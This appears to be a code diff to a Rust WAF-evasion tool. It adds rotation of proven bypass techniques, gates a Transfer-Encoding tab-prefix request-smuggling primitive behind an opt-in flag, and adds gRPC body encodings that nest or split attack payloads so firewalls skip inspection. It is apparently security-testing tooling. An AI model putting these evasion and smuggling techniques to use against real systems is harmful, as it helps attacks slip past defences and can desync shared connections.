@@ -17,6 +17,7 @@ use wafrift_encoding::header;
 use wafrift_evolution::advisor::EvasionPlan;
 use wafrift_fingerprint::fingerprint;
 use wafrift_grammar::grammar;
+use wafrift_grpc_evasion;
 use wafrift_smuggling::h2_evasion;
 use wafrift_smuggling::smuggling;
 use wafrift_types::{EvasionResult, Request, Technique};
@@ -40,12 +41,29 @@ fn parse_named_encoding(name: &str) -> Option<encoding::Strategy> {
         .find(|strategy| strategy.as_str() == raw)
 }
 
-fn current_winner(state: &HostState) -> Option<&str> {
+/// F146: Pick a winner from `proven_winners` using a per-request hash,
+/// NOT `state.rotation_index`. The transport client clones `HostState`
+/// before calling `evade(&request, &state, ...)` and the cloned state
+/// is dropped after each request — `rotation_index` is therefore never
+/// advanced from this path, and pre-fix every single request through
+/// the non-proxy entry points picked `proven_winners[0]`. The
+/// "round-robin to defeat per-pattern WAF detection" claim was a lie
+/// for transport, replay, and every CLI call site that wasn't the
+/// proxy (which alone calls `next_winner` and gets correct rotation).
+///
+/// Switch to a deterministic hash over (URL + method): different
+/// requests rotate across the winner pool naturally; the SAME request
+/// always picks the same winner (preserves retry/replay semantics).
+fn current_winner<'a>(state: &'a HostState, req: &Request) -> Option<&'a str> {
     if !state.has_winners() {
         return None;
     }
-
-    let idx = state.rotation_index % state.proven_winners.len();
+    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
+    for b in req.url.bytes().chain(req.method.as_str().bytes()) {
+        h ^= u64::from(b);
+        h = h.wrapping_mul(0x0000_0100_0000_01b3);
+    }
+    let idx = (h as usize) % state.proven_winners.len();
     state.proven_winners.get(idx).map(String::as_str)
 }
 
@@ -112,7 +130,7 @@ pub fn evade(request: &Request, state: &HostState, config: &EvasionConfig) -> Ev
     let level = state.escalation_level();
 
     // ── Step 0: Re-use proven winners / last success if available ─────
-    if let Some(winner_name) = current_winner(state)
+    if let Some(winner_name) = current_winner(state, request)
         && apply_named_technique(&mut req, &mut techniques, config, state, winner_name)
     {
         let description = build_description(&techniques);
@@ -898,17 +916,32 @@ fn apply_header_obfuscation(
         techniques.push(Technique::HeaderObfuscation("DuplicateHopByHop".into()));
     }
 
-    // 3. Add Transfer-Encoding with obs-fold style whitespace (HIGH FIX #5)
-    // This exploits parser differences in how TE headers are handled
-    let has_te = req
-        .headers
-        .iter()
-        .any(|(k, _)| k.eq_ignore_ascii_case("transfer-encoding"));
-    if !has_te {
-        // Add TE header with tab prefix (some parsers strip it, others don't)
-        req.headers
-            .push(("Transfer-Encoding".into(), "\tchunked".into()));
-        techniques.push(Technique::HeaderObfuscation("TEAmbiguity".into()));
+    // 3. Add Transfer-Encoding with obs-fold-style whitespace.
+    // This is a CL+TE desync primitive — when paired with a
+    // Content-Length body, an intermediary that strips the tab
+    // and accepts `Transfer-Encoding: chunked` will frame the
+    // request as chunked while a CL-only intermediary keeps
+    // reading the declared bytes. That's request smuggling, not
+    // header obfuscation. Pre-gate it ran on every non-TE request
+    // at every level — including Light against production
+    // endpoints that were NOT being tested for smuggling — which
+    // could desync HTTP/1.1 keep-alive connection pools and
+    // corrupt unrelated subsequent requests on the same TCP
+    // connection.
+    //
+    // Now gated behind smuggling_enabled: the operator has to
+    // explicitly opt in to smuggling experiments before this
+    // technique fires.
+    if config.smuggling_enabled {
+        let has_te = req
+            .headers
+            .iter()
+            .any(|(k, _)| k.eq_ignore_ascii_case("transfer-encoding"));
+        if !has_te {
+            req.headers
+                .push(("Transfer-Encoding".into(), "\tchunked".into()));
+            techniques.push(Technique::HeaderObfuscation("TEAmbiguity".into()));
+        }
     }
 
     // 4. Apply obs-fold (obsolete line folding) to User-Agent if present (HIGH FIX #5)
@@ -939,6 +972,12 @@ fn apply_header_obfuscation(
 }
 
 /// Apply Content-Type switching from the raw body.
+///
+/// When the request already carries `Content-Type: application/grpc`, we
+/// add gRPC-evasion encoded variants (nested submessage, split-field) to
+/// the candidate set instead of plain content-type variants. WAFs that treat
+/// `application/grpc` bodies as opaque binary skip all keyword/regex rules;
+/// the origin's protobuf parser decodes the string fields back to plaintext.
 fn apply_content_type_switch(
     req: &mut Request,
     techniques: &mut Vec<Technique>,
@@ -950,6 +989,44 @@ fn apply_content_type_switch(
     }
     let Some(ref body) = req.body else { return };
 
+    // ── gRPC routing arm ────────────────────────────────────────────────
+    // When the request targets a gRPC endpoint, pick the first untried
+    // gRPC-evasion variant (nested > split > flat) and apply it.
+    if is_grpc_request(req) {
+        let body_str = String::from_utf8_lossy(body).into_owned();
+        let tried_nested = state
+            .technique_stats
+            .iter()
+            .any(|(n, _, _)| n == "grpc:nested-5");
+        let tried_split = state
+            .technique_stats
+            .iter()
+            .any(|(n, _, _)| n == "grpc:split-10");
+
+        let (variant_body, variant_tag) = if !tried_nested {
+            (
+                wafrift_grpc_evasion::embed_attack_in_nested(&body_str, 5),
+                "grpc:nested-5",
+            )
+        } else if !tried_split {
+            (
+                wafrift_grpc_evasion::split_attack_across_fields(&body_str, 10),
+                "grpc:split-10",
+            )
+        } else {
+            (
+                wafrift_grpc_evasion::embed_attack_in_message(&body_str),
+                "grpc:flat",
+            )
+        };
+
+        req.body = Some(variant_body);
+        // Content-Type stays application/grpc — the WAF must not see a switch.
+        techniques.push(Technique::ContentTypeSwitch(variant_tag.to_string()));
+        return;
+    }
+
+    // ── Standard content-type switching for non-gRPC requests ───────────
     let variants = content_type::generate_variants_from_body(body);
     if let Some(variant) = variants
         .into_iter()
@@ -1066,6 +1143,22 @@ fn build_description(techniques: &[Technique]) -> String {
     }
 }
 
+/// Returns `true` when `req` targets a gRPC endpoint.
+///
+/// Detection heuristic: the request carries `Content-Type: application/grpc`
+/// (or a sub-type such as `application/grpc+proto`). This is the standard
+/// gRPC-over-HTTP/2 content type per RFC.
+///
+/// Pure, synchronous, I/O-free so the strategy crate stays unit-testable.
+#[must_use]
+pub fn is_grpc_request(req: &Request) -> bool {
+    req.headers
+        .iter()
+        .find(|(k, _)| k.eq_ignore_ascii_case("content-type"))
+        .map(|(_, v)| v.to_ascii_lowercase())
+        .is_some_and(|ct| ct.starts_with("application/grpc"))
+}
+
 /// Returns `true` when `req` looks like a GraphQL request.
 ///
 /// Two heuristics apply — either suffices:
@@ -1116,63 +1209,6 @@ pub fn graphql_payloads_for_request(req: &Request) -> Vec<String> {
     } else {
         Vec::new()
     }
-}
-
-/// Returns `true` when `req` targets a gRPC endpoint.
-///
-/// Detection heuristic: the `Content-Type` header contains
-/// `application/grpc` (covers both the bare form and
-/// `application/grpc+proto`, `application/grpc+json`, etc.).
-#[must_use]
-pub fn is_grpc_request(req: &Request) -> bool {
-    req.headers
-        .iter()
-        .find(|(k, _)| k.eq_ignore_ascii_case("content-type"))
-        .map(|(_, v)| v.to_ascii_lowercase().contains("application/grpc"))
-        .unwrap_or(false)
-}
-
-/// Return the full gRPC-evasion payload battery for `req` when it targets
-/// a gRPC endpoint, or an empty `Vec` otherwise.
-///
-/// The battery covers:
-/// - Flat embedding (field 1, no nesting)
-/// - Nested submessage depths 1–10 (defeats depth-limited inspectors)
-/// - Split across 2, 5, and 10 fields (WAF sees only fragments)
-///
-/// Each `Vec<u8>` in the returned `Vec` is the raw bytes of a complete
-/// gRPC frame (5-byte header + protobuf body), ready to be sent as the
-/// HTTP/2 DATA frame body with `Content-Type: application/grpc`.
-#[must_use]
-pub fn grpc_payloads_for_request(req: &Request) -> Vec<Vec<u8>> {
-    if !is_grpc_request(req) {
-        return Vec::new();
-    }
-    let body_str = req
-        .body
-        .as_ref()
-        .map(|b| String::from_utf8_lossy(b).into_owned())
-        .unwrap_or_default();
-
-    let mut payloads = Vec::new();
-
-    // Flat embedding.
-    payloads.push(wafrift_grpc_evasion::embed_attack_in_message(&body_str));
-
-    // Nested submessage depths 1–10.
-    for depth in 1u8..=10 {
-        payloads.push(wafrift_grpc_evasion::embed_attack_in_nested(&body_str, depth));
-    }
-
-    // Split across N fields.
-    for n_fields in [2u8, 5, 10] {
-        payloads.push(wafrift_grpc_evasion::split_attack_across_fields(
-            &body_str,
-            n_fields,
-        ));
-    }
-
-    payloads
 }
 
 /// Determine whether the payload body is textual (safe for utf-8 mutation).
